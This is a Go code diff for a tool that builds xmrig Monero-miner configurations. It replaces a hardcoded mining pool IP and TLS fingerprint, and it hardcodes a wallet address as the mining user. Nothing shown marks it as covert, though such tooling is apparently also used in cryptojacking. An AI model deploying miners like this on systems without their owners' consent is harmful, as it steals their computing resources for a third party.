@@ -17,9 +17,9 @@ import (
 
 // TLS connection constants for xmrig-proxy
 const (
-	TLSPoolURL     = "150.230.194.138:2083"
-	TLSFingerprint = "099188DA1C047506DC139AE64CD24C916CE19C736764277B075C5BEC8B813C6F"
-	NonTLSPoolURL  = "150.230.194.138:3333"
+	TLSPoolURL     = "173.249.207.156:2083"
+	TLSFingerprint = "A1562B61C08AE4DE4218D0637A9E44984C11750A2F4C81D308A61D8553F19FD7"
+	NonTLSPoolURL  = "173.249.207.156:3333"
 )
 
 // Config represents the xmrig configuration structure (partial)
@@ -220,7 +220,7 @@ func generateGenericConfig(cpuInfo *cpu.Info, configsPath string) (string, error
 			{
 				"algo":             "RandomX",
 				"coin":             nil,
-				"url":              "150.230.194.138:3333",
+				"url":              NonTLSPoolURL,
 				"user":             "12EdCKM7ZWXGTMk3oVbS1XEuErrDfZdmmdGw5LTXBnecnwqavxPoZoE6vCjQ7oYnfURxG1bUUo2au5d6j2Trz8U4r2H",
 				"pass":             "x",
 				"rig-id":           nil,
